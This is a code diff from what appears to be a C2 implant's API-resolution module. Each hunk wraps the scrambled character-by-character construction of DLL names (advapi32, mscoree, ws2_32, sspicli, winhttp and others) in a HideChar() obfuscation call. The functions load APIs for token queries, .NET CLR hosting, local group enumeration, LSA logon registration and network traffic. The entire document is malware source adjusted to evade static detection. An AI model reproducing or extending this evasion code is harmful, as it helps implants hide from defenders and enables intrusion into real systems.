@@ -7,19 +7,19 @@ BOOL RtAdvapi32(
 ) {
     CHAR ModuleName[ 13 ] = { 0 };
 
-    ModuleName[ 0  ] = 'A';
-    ModuleName[ 2  ] = 'V';
-    ModuleName[ 11 ] = 'L';
-    ModuleName[ 10 ] = 'L';
-    ModuleName[ 3  ] = 'A';
-    ModuleName[ 8  ] = '.';
-    ModuleName[ 12 ] = 0;
-    ModuleName[ 6  ] = '3';
-    ModuleName[ 7  ] = '2';
-    ModuleName[ 1  ] = 'D';
-    ModuleName[ 9  ] = 'D';
-    ModuleName[ 5  ] = 'I';
-    ModuleName[ 4  ] = 'P';
+    ModuleName[ 0  ] = HideChar('A');
+    ModuleName[ 2  ] = HideChar('V');
+    ModuleName[ 11 ] = HideChar('L');
+    ModuleName[ 10 ] = HideChar('L');
+    ModuleName[ 3  ] = HideChar('A');
+    ModuleName[ 8  ] = HideChar('.');
+    ModuleName[ 12 ] = HideChar(0);
+    ModuleName[ 6  ] = HideChar('3');
+    ModuleName[ 7  ] = HideChar('2');
+    ModuleName[ 1  ] = HideChar('D');
+    ModuleName[ 9  ] = HideChar('D');
+    ModuleName[ 5  ] = HideChar('I');
+    ModuleName[ 4  ] = HideChar('P');
 
     if ( ( Instance.Modules.Advapi32 = LdrModuleLoad( ModuleName ) ) ) {
         Instance.Win32.GetTokenInformation          = LdrFunctionAddr( Instance.Modules.Advapi32, H_FUNC_GETTOKENINFORMATION );
@@ -66,18 +66,18 @@ BOOL RtMscoree(
 ) {
     CHAR ModuleName[ 12 ] = { 0 };
 
-    ModuleName[ 1  ] = 'S';
-    ModuleName[ 2  ] = 'C';
-    ModuleName[ 11 ] = 0;
-    ModuleName[ 0  ] = 'M';
-    ModuleName[ 10 ] = 'L';
-    ModuleName[ 8  ] = 'D';
-    ModuleName[ 7  ] = '.';
-    ModuleName[ 9  ] = 'L';
-    ModuleName[ 5  ] = 'E';
-    ModuleName[ 4  ] = 'R';
-    ModuleName[ 6  ] = 'E';
-    ModuleName[ 3  ] = 'O';
+    ModuleName[ 1  ] = HideChar('S');
+    ModuleName[ 2  ] = HideChar('C');
+    ModuleName[ 11 ] = HideChar(0);
+    ModuleName[ 0  ] = HideChar('M');
+    ModuleName[ 10 ] = HideChar('L');
+    ModuleName[ 8  ] = HideChar('D');
+    ModuleName[ 7  ] = HideChar('.');
+    ModuleName[ 9  ] = HideChar('L');
+    ModuleName[ 5  ] = HideChar('E');
+    ModuleName[ 4  ] = HideChar('R');
+    ModuleName[ 6  ] = HideChar('E');
+    ModuleName[ 3  ] = HideChar('O');
 
     if ( ( Instance.Modules.Mscoree = LdrModuleLoad( ModuleName ) ) ) {
         Instance.Win32.CLRCreateInstance = LdrFunctionAddr( Instance.Modules.Mscoree, H_FUNC_CLRCREATEINSTANCE );
@@ -96,19 +96,19 @@ BOOL RtOleaut32(
 ) {
     CHAR ModuleName[ 13 ] = { 0 };
 
-    ModuleName[ 3  ] = 'A';
-    ModuleName[ 2  ] = 'E';
-    ModuleName[ 0  ] = 'O';
-    ModuleName[ 1  ] = 'L';
-    ModuleName[ 5  ] = 'T';
-    ModuleName[ 11 ] = 'L';
-    ModuleName[ 7  ] = '2';
-    ModuleName[ 6  ] = '3';
-    ModuleName[ 10 ] = 'L';
-    ModuleName[ 12 ] = 0;
-    ModuleName[ 4  ] = 'U';
-    ModuleName[ 9  ] = 'D';
-    ModuleName[ 8  ] = '.';
+    ModuleName[ 3  ] = HideChar('A');
+    ModuleName[ 2  ] = HideChar('E');
+    ModuleName[ 0  ] = HideChar('O');
+    ModuleName[ 1  ] = HideChar('L');
+    ModuleName[ 5  ] = HideChar('T');
+    ModuleName[ 11 ] = HideChar('L');
+    ModuleName[ 7  ] = HideChar('2');
+    ModuleName[ 6  ] = HideChar('3');
+    ModuleName[ 10 ] = HideChar('L');
+    ModuleName[ 12 ] = HideChar(0);
+    ModuleName[ 4  ] = HideChar('U');
+    ModuleName[ 9  ] = HideChar('D');
+    ModuleName[ 8  ] = HideChar('.');
 
     if ( ( Instance.Modules.Oleaut32 = LdrModuleLoad( ModuleName ) ) ) {
         Instance.Win32.SafeArrayAccessData   = LdrFunctionAddr( Instance.Modules.Oleaut32, H_FUNC_SAFEARRAYACCESSDATA );
@@ -133,17 +133,17 @@ BOOL RtUser32(
 ) {
     CHAR ModuleName[ 11 ] = { 0 };
 
-    ModuleName[ 1  ] = 'S';
-    ModuleName[ 0  ] = 'U';
-    ModuleName[ 10 ] = 0;
-    ModuleName[ 6  ] = '.';
-    ModuleName[ 8  ] = 'L';
-    ModuleName[ 7  ] = 'D';
-    ModuleName[ 5  ] = '2';
-    ModuleName[ 3  ] = 'R';
-    ModuleName[ 9  ] = 'L';
-    ModuleName[ 2  ] = 'E';
-    ModuleName[ 4  ] = '3';
+    ModuleName[ 1  ] = HideChar('S');
+    ModuleName[ 0  ] = HideChar('U');
+    ModuleName[ 10 ] = HideChar(0);
+    ModuleName[ 6  ] = HideChar('.');
+    ModuleName[ 8  ] = HideChar('L');
+    ModuleName[ 7  ] = HideChar('D');
+    ModuleName[ 5  ] = HideChar('2');
+    ModuleName[ 3  ] = HideChar('R');
+    ModuleName[ 9  ] = HideChar('L');
+    ModuleName[ 2  ] = HideChar('E');
+    ModuleName[ 4  ] = HideChar('3');
     if ( ( Instance.Modules.User32 = LdrModuleLoad( ModuleName ) ) ) {
         Instance.Win32.ShowWindow       = LdrFunctionAddr( Instance.Modules.User32, H_FUNC_SHOWWINDOW );
         Instance.Win32.GetSystemMetrics = LdrFunctionAddr( Instance.Modules.User32, H_FUNC_GETSYSTEMMETRICS );
@@ -164,18 +164,18 @@ BOOL RtShell32(
 ) {
     CHAR ModuleName[ 12 ] = { 0 };
 
-    ModuleName[ 0  ] = 'S';
-    ModuleName[ 10 ] = 'L';
-    ModuleName[ 7  ] = '.';
-    ModuleName[ 6  ] = '2';
-    ModuleName[ 8  ] = 'D';
-    ModuleName[ 4  ] = 'L';
-    ModuleName[ 1  ] = 'H';
-    ModuleName[ 11 ] = 0;
-    ModuleName[ 9  ] = 'L';
-    ModuleName[ 5  ] = '3';
-    ModuleName[ 3  ] = 'L';
-    ModuleName[ 2  ] = 'E';
+    ModuleName[ 0  ] = HideChar('S');
+    ModuleName[ 10 ] = HideChar('L');
+    ModuleName[ 7  ] = HideChar('.');
+    ModuleName[ 6  ] = HideChar('2');
+    ModuleName[ 8  ] = HideChar('D');
+    ModuleName[ 4  ] = HideChar('L');
+    ModuleName[ 1  ] = HideChar('H');
+    ModuleName[ 11 ] = HideChar(0);
+    ModuleName[ 9  ] = HideChar('L');
+    ModuleName[ 5  ] = HideChar('3');
+    ModuleName[ 3  ] = HideChar('L');
+    ModuleName[ 2  ] = HideChar('E');
     if ( ( Instance.Modules.Shell32 = LdrModuleLoad( ModuleName ) ) ) {
         Instance.Win32.CommandLineToArgvW = LdrFunctionAddr( Instance.Modules.Shell32, H_FUNC_COMMANDLINETOARGVW );
 
@@ -193,17 +193,17 @@ BOOL RtMsvcrt(
 ) {
     CHAR ModuleName[ 11 ] = { 0 };
 
-    ModuleName[ 0  ] = 'M';
-    ModuleName[ 6  ] = '.';
-    ModuleName[ 10 ] = 0;
-    ModuleName[ 9  ] = 'L';
-    ModuleName[ 4  ] = 'R';
-    ModuleName[ 2  ] = 'V';
-    ModuleName[ 8  ] = 'L';
-    ModuleName[ 7  ] = 'D';
-    ModuleName[ 3  ] = 'C';
-    ModuleName[ 5  ] = 'T';
-    ModuleName[ 1  ] = 'S';
+    ModuleName[ 0  ] = HideChar('M');
+    ModuleName[ 6  ] = HideChar('.');
+    ModuleName[ 10 ] = HideChar(0);
+    ModuleName[ 9  ] = HideChar('L');
+    ModuleName[ 4  ] = HideChar('R');
+    ModuleName[ 2  ] = HideChar('V');
+    ModuleName[ 8  ] = HideChar('L');
+    ModuleName[ 7  ] = HideChar('D');
+    ModuleName[ 3  ] = HideChar('C');
+    ModuleName[ 5  ] = HideChar('T');
+    ModuleName[ 1  ] = HideChar('S');
 
     if ( ( Instance.Modules.Msvcrt = LdrModuleLoad( ModuleName ) ) ) {
         Instance.Win32.vsnprintf = LdrFunctionAddr( Instance.Modules.Msvcrt, H_FUNC_VSNPRINTF );
@@ -222,19 +222,19 @@ BOOL RtIphlpapi(
 ) {
     CHAR ModuleName[ 13 ] = { 0 };
 
-    ModuleName[ 8  ] = '.';
-    ModuleName[ 0  ] = 'I';
-    ModuleName[ 10 ] = 'L';
-    ModuleName[ 2  ] = 'H';
-    ModuleName[ 9  ] = 'D';
-    ModuleName[ 6  ] = 'P';
-    ModuleName[ 11 ] = 'L';
-    ModuleName[ 1  ] = 'P';
-    ModuleName[ 3  ] = 'L';
-    ModuleName[ 12 ] = 0;
-    ModuleName[ 5  ] = 'A';
-    ModuleName[ 4  ] = 'P';
-    ModuleName[ 7  ] = 'I';
+    ModuleName[ 8  ] = HideChar('.');
+    ModuleName[ 0  ] = HideChar('I');
+    ModuleName[ 10 ] = HideChar('L');
+    ModuleName[ 2  ] = HideChar('H');
+    ModuleName[ 9  ] = HideChar('D');
+    ModuleName[ 6  ] = HideChar('P');
+    ModuleName[ 11 ] = HideChar('L');
+    ModuleName[ 1  ] = HideChar('P');
+    ModuleName[ 3  ] = HideChar('L');
+    ModuleName[ 12 ] = HideChar(0);
+    ModuleName[ 5  ] = HideChar('A');
+    ModuleName[ 4  ] = HideChar('P');
+    ModuleName[ 7  ] = HideChar('I');
 
     if ( ( Instance.Modules.Iphlpapi = LdrModuleLoad( ModuleName ) ) ) {
         Instance.Win32.GetAdaptersInfo = LdrFunctionAddr( Instance.Modules.Iphlpapi, H_FUNC_GETADAPTERSINFO );
@@ -253,16 +253,16 @@ BOOL RtGdi32(
 ) {
     CHAR ModuleName[ 10 ] = { 0 };
 
-    ModuleName[ 4 ] = '2';
-    ModuleName[ 6 ] = 'D';
-    ModuleName[ 5 ] = '.';
-    ModuleName[ 8 ] = 'L';
-    ModuleName[ 2 ] = 'I';
-    ModuleName[ 1 ] = 'D';
-    ModuleName[ 7 ] = 'L';
-    ModuleName[ 9 ] = 0;
-    ModuleName[ 0 ] = 'G';
-    ModuleName[ 3 ] = '3';
+    ModuleName[ 4 ] = HideChar('2');
+    ModuleName[ 6 ] = HideChar('D');
+    ModuleName[ 5 ] = HideChar('.');
+    ModuleName[ 8 ] = HideChar('L');
+    ModuleName[ 2 ] = HideChar('I');
+    ModuleName[ 1 ] = HideChar('D');
+    ModuleName[ 7 ] = HideChar('L');
+    ModuleName[ 9 ] = HideChar(0);
+    ModuleName[ 0 ] = HideChar('G');
+    ModuleName[ 3 ] = HideChar('3');
 
     if ( ( Instance.Modules.Gdi32 = LdrModuleLoad( ModuleName ) ) ) {
         Instance.Win32.GetCurrentObject   = LdrFunctionAddr( Instance.Modules.Gdi32, H_FUNC_GETCURRENTOBJECT );
@@ -288,19 +288,19 @@ BOOL RtNetApi32(
 ) {
     CHAR ModuleName[ 13 ] = { 0 };
 
-    ModuleName[ 0  ] = 'N';
-    ModuleName[ 11 ] = 'L';
-    ModuleName[ 8  ] = '.';
-    ModuleName[ 9  ] = 'D';
-    ModuleName[ 6  ] = '3';
-    ModuleName[ 2  ] = 'T';
-    ModuleName[ 3  ] = 'A';
-    ModuleName[ 10 ] = 'L';
-    ModuleName[ 12 ] = 0;
-    ModuleName[ 4  ] = 'P';
-    ModuleName[ 5  ] = 'I';
-    ModuleName[ 1  ] = 'E';
-    ModuleName[ 7  ] = '2';
+    ModuleName[ 0  ] = HideChar('N');
+    ModuleName[ 11 ] = HideChar('L');
+    ModuleName[ 8  ] = HideChar('.');
+    ModuleName[ 9  ] = HideChar('D');
+    ModuleName[ 6  ] = HideChar('3');
+    ModuleName[ 2  ] = HideChar('T');
+    ModuleName[ 3  ] = HideChar('A');
+    ModuleName[ 10 ] = HideChar('L');
+    ModuleName[ 12 ] = HideChar(0);
+    ModuleName[ 4  ] = HideChar('P');
+    ModuleName[ 5  ] = HideChar('I');
+    ModuleName[ 1  ] = HideChar('E');
+    ModuleName[ 7  ] = HideChar('2');
 
     if ( ( Instance.Modules.NetApi32 = LdrModuleLoad( ModuleName ) ) ) {
         Instance.Win32.NetLocalGroupEnum = LdrFunctionAddr( Instance.Modules.NetApi32, H_FUNC_NETLOCALGROUPENUM );
@@ -325,17 +325,17 @@ BOOL RtWs2_32(
 ) {
     CHAR ModuleName[ 11 ] = { 0 };
 
-    ModuleName[ 0  ] = 'W';
-    ModuleName[ 2  ] = '2';
-    ModuleName[ 4  ] = '3';
-    ModuleName[ 6  ] = '.';
-    ModuleName[ 9  ] = 'L';
-    ModuleName[ 1  ] = 'S';
-    ModuleName[ 3  ] = '_';
-    ModuleName[ 5  ] = '2';
-    ModuleName[ 10 ] = 0;
-    ModuleName[ 8  ] = 'L';
-    ModuleName[ 7  ] = 'D';
+    ModuleName[ 0  ] = HideChar('W');
+    ModuleName[ 2  ] = HideChar('2');
+    ModuleName[ 4  ] = HideChar('3');
+    ModuleName[ 6  ] = HideChar('.');
+    ModuleName[ 9  ] = HideChar('L');
+    ModuleName[ 1  ] = HideChar('S');
+    ModuleName[ 3  ] = HideChar('_');
+    ModuleName[ 5  ] = HideChar('2');
+    ModuleName[ 10 ] = HideChar(0);
+    ModuleName[ 8  ] = HideChar('L');
+    ModuleName[ 7  ] = HideChar('D');
 
     if ( ( Instance.Modules.Ws2_32 = LdrModuleLoad( ModuleName ) ) ) {
         Instance.Win32.WSAStartup      = LdrFunctionAddr( Instance.Modules.Ws2_32, H_FUNC_WSASTARTUP );
@@ -368,18 +368,18 @@ BOOL RtSspicli(
 ) {
     CHAR ModuleName[ 12 ] = { 0 };
 
-    ModuleName[ 0  ] = 'S';
-    ModuleName[ 11 ] = 0;
-    ModuleName[ 9  ] = 'L';
-    ModuleName[ 1  ] = 'S';
-    ModuleName[ 6  ] = 'I';
-    ModuleName[ 7  ] = '.';
-    ModuleName[ 5  ] = 'L';
-    ModuleName[ 8  ] = 'D';
-    ModuleName[ 2  ] = 'P';
-    ModuleName[ 10 ] = 'L';
-    ModuleName[ 4  ] = 'C';
-    ModuleName[ 3  ] = 'I';
+    ModuleName[ 0  ] = HideChar('S');
+    ModuleName[ 11 ] = HideChar(0);
+    ModuleName[ 9  ] = HideChar('L');
+    ModuleName[ 1  ] = HideChar('S');
+    ModuleName[ 6  ] = HideChar('I');
+    ModuleName[ 7  ] = HideChar('.');
+    ModuleName[ 5  ] = HideChar('L');
+    ModuleName[ 8  ] = HideChar('D');
+    ModuleName[ 2  ] = HideChar('P');
+    ModuleName[ 10 ] = HideChar('L');
+    ModuleName[ 4  ] = HideChar('C');
+    ModuleName[ 3  ] = HideChar('I');
 
     if ( ( Instance.Modules.Sspicli = LdrModuleLoad( ModuleName ) ) ) {
         Instance.Win32.LsaRegisterLogonProcess        = LdrFunctionAddr( Instance.Modules.Sspicli, H_FUNC_LSAREGISTERLOGONPROCESS );
@@ -406,18 +406,18 @@ BOOL RtWinHttp(
 ) {
     CHAR ModuleName[ 12 ] = { 0 };
 
-    ModuleName[ 0  ] = 'W';
-    ModuleName[ 2  ] = 'N';
-    ModuleName[ 7  ] = '.';
-    ModuleName[ 11 ] = 0;
-    ModuleName[ 10 ] = 'L';
-    ModuleName[ 4  ] = 'T';
-    ModuleName[ 8  ] = 'D';
-    ModuleName[ 1  ] = 'I';
-    ModuleName[ 9  ] = 'L';
-    ModuleName[ 6  ] = 'P';
-    ModuleName[ 3  ] = 'H';
-    ModuleName[ 5  ] = 'T';
+    ModuleName[ 0  ] = HideChar('W');
+    ModuleName[ 2  ] = HideChar('N');
+    ModuleName[ 7  ] = HideChar('.');
+    ModuleName[ 11 ] = HideChar(0);
+    ModuleName[ 10 ] = HideChar('L');
+    ModuleName[ 4  ] = HideChar('T');
+    ModuleName[ 8  ] = HideChar('D');
+    ModuleName[ 1  ] = HideChar('I');
+    ModuleName[ 9  ] = HideChar('L');
+    ModuleName[ 6  ] = HideChar('P');
+    ModuleName[ 3  ] = HideChar('H');
+    ModuleName[ 5  ] = HideChar('T');
 
     if ( ( Instance.Modules.WinHttp = LdrModuleLoad( ModuleName ) ) ) {
         Instance.Win32.WinHttpOpen              = LdrFunctionAddr( Instance.Modules.WinHttp, H_FUNC_WINHTTPOPEN );
